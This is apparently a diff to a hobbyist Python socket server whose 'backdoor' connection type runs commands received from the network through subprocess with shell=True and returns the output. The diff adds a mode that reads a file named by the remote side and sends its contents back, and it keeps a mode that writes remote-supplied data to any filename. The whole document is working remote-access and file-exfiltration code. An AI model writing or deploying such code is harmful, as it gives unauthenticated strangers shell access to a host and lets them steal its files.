@@ -31,31 +31,51 @@ while listening != 0:
     conntype = c.recv(1024).decode('utf-8')
     print("connection type: " + conntype)
     filename = ""
+    direction = 'to'
     if conntype == "filetransfer": # get the new file name
+        c.send(b'transferwhich')
         msg = c.recv(2048).decode('utf-8')
-        c.send(("MAKING FILE: " + msg).encode('utf-8'))
+        c.send(b'direction')
+        direction = c.recv(8).decode('utf-8')
+        print(direction)
         filename = msg
-        with open(filename, "w") as f:
-            print("made file")
+        print(filename)
+        if direction == 'to':
+            c.send(("MAKING FILE: " + msg).encode('utf-8'))
+            with open(filename, "w") as f:
+                print("made file")            
     while True: # main connection loop
         msg = "" # information they sent us
         print("retrieving message...")
         msg = c.recv(2048).decode('utf-8')
-        print("msg: " + msg)
         if msg == "exit": # exit condition
             break
+        if conntype == "default": # backdoor, for running commands/applications
+            print(msg)
+            send = sys.stdin.read(1)
+            c.send(send.encode('utf-8'))
+            
         if conntype == "backdoor": # backdoor, for running commands/applications
             try:
-                stdout = subprocess.check_output(msg, shell=True).decode('utf-8') + "\ncompleted"
+                stdout = subprocess.check_output(msg, shell=True).decode('utf-8') + "completed"
                 c.send(stdout.encode('utf-8'))
             except Exception as e:
                 c.send(('lacekdog: ' + msg + ': Not a command!\nError: ' + str(e)).encode('utf-8'))
         if conntype == "filetransfer": # file 
-            with open(filename, "a") as file:
-                print("WRITING TO FILE: ")
-                print("CONTETS: " + msg)
-                file.write(msg)
-                c.send(("Written " + str(len(msg)) + " to file " + filename).encode('utf-8'))
+            if direction == 'to':
+                with open(filename, "a") as file:
+                    print("WRITING TO FILE: ")
+                    print("CONTETS: " + msg)
+                    file.write(msg)
+                    c.send(("Written " + str(len(msg)) + " to file " + filename).encode('utf-8'))
+            elif direction == 'from':
+                print(msg)
+                with open(filename) as file:
+                    fstr = file.read(2048)
+                    c.send(fstr.encode('utf-8'))
+                    recieved = c.recv(2048).decode('utf-8')
+                    if len(fstr) < 2048 and recieved != '':
+                        break
     c.close()
     listening-=1
 
